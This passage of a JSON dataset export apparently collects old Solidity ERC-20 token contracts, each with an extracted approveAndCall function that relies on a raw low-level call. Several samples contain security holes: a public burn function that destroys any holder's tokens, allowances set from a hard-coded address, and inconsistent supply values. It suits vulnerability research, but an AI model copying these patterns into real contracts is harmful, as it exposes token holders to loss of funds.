if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), 0x774F6B8302213946165c10F6Ea2011AF91cF8711, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[0x774F6B8302213946165c10F6Ea2011AF91cF8711][_spender] = _value;\nApproval(0x774F6B8302213946165c10F6Ea2011AF91cF8711, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), 0x774F6B8302213946165c10F6Ea2011AF91cF8711, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14f1"
  },
  "filename": "33236.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract DANK is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function DANK(\n ) {\n balances[msg.sender] = 1000000000000;\n totalSupply = 1000000000000;\n name = \"DANK\";\n decimals = 4;\n symbol = \"DANK\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14f2"
  },
  "filename": "33268.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract TaggChainToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function TaggChainToken(\n ) {\n balances[msg.sender] = 8400000000000000;\n totalSupply = 8400000000000000;\n name = \"Tagg Chain\";\n decimals = 8;\n symbol = \"TGC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14f3"
  },
  "filename": "33329.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 12000000000000000000000000;\n totalSupply = 12000000000000000000000000;\n name = \"eVOLVE Coin\";\n decimals = 18;\n symbol = \"EVOC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14f4"
  },
  "filename": "33367.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Number is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Number(\n ) {\n balances[msg.sender] = 1100000000000000000000000000;\n totalSupply = 1100000000000000000000000000;\n name = \"Number\";\n decimals = 18;\n symbol = \"NUM\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14f5"
  },
  "filename": "33378.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000;\n totalSupply = 100000000000;\n name = \"Ethereum Premium\";\n decimals = 4;\n symbol = \"ETHPR\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14f6"
  },
  "filename": "33383.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 6000000;\n totalSupply = 6000000000000000;\n name = \"metacube\";\n decimals = 18;\n symbol = \"MTC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14f7"
  },
  "filename": "33388.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 3000000;\n totalSupply = 6000000;\n name = \"metacube\";\n decimals = 18;\n symbol = \"MTC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14f8"
  },
  "filename": "33390.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000;\n totalSupply = 100000000000;\n name = \"Bitcoin Premium\";\n decimals = 4;\n symbol = \"BTP\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14f9"
  },
  "filename": "33392.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000;\n totalSupply = 10000000000;\n name = \"Bitcoin Premium\";\n decimals = 3;\n symbol = \"BTPS\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14fa"
  },
  "filename": "33406.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract Owned {\n address public owner;\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function Owned() public {\n owner = msg.sender;\n }\n function transferOwnership(address _owner) public onlyOwner {\n require(_owner != 0x0);\n owner = _owner;\n }\n}\ncontract DIoTNetworkShare is StandardToken, Owned {\n string public name = \"Decentralized IoT Network Share\";\n uint256 public decimals = 18;\n string public symbol = \"DNS\";\n string public version = \"H0.1\";\n function DIoTNetworkShare() public {\n totalSupply = (10 ** 9) * (10 ** decimals);\n balances[msg.sender] = totalSupply;\n }\n function() public payable {\n revert();\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if (!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) {\n revert();\n }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif (!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) {\nrevert();\n}\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14fb"
  },
  "filename": "33413.sol",
  "content": "pragma solidity ^0.4.13;\ncontract Token {\n function totalSupply() constant returns (uint256 supply);\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event Burn(address indexed from, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n function onePercent(uint256 a) internal constant returns (uint256){\n return div(a,uint256(100));\n }\n function power(uint256 a,uint256 b) internal constant returns (uint256){\n return mul(a,10**b);\n }\n}\ncontract StandardToken is Token {\n using SafeMath for uint256;\n uint8 public decimals;\n mapping(address=>bool) internal withoutFee;\n uint256 internal maxFee;\n function transfer(address _to, uint256 _value) returns (bool success) {\n uint256 fee=getFee(_value);\n if (balances[msg.sender].add(fee) >= _value && _value > 0) {\n doTransfer(msg.sender,_to,_value,fee);\n return true;\n } else { return false; }\n }\n function getFee(uint256 _value) private returns (uint256){\n uint256 onePercentOfValue=_value.onePercent();\n uint256 fee=uint256(maxFee).power(decimals);\n if (_value.add(onePercentOfValue) >= fee) {\n return fee;\n } if (_value.add(onePercentOfValue) < fee) {\n return onePercentOfValue;\n }\n }\n function doTransfer(address _from,address _to,uint256 _value,uint256 fee) internal {\n balances[_from] =balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(_from, _to, _value);\n if(!withoutFee[_from]){\n doBurn(msg.sender,fee);\n }\n }\n function doBurn(address _from,uint256 _value) private returns (bool success){\n require(balanceOf(_from) >= _value);\n balances[_from] =balances[_from].sub(_value);\n _totalSupply =_totalSupply.sub(_value);\n Burn(_from, _value);\n return true;\n }\n function burn(address _from,uint256 _value) public returns (bool success) {\n return doBurn(_from,_value);\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n uint256 fee=getFee(_value);\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0 && balances[msg.sender]>fee) {\n doTransfer(_from,_to,_value,getFee(_value));\n allowed[_from][msg.sender] =allowed[_from][msg.sender].sub(_value.add(fee));\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function 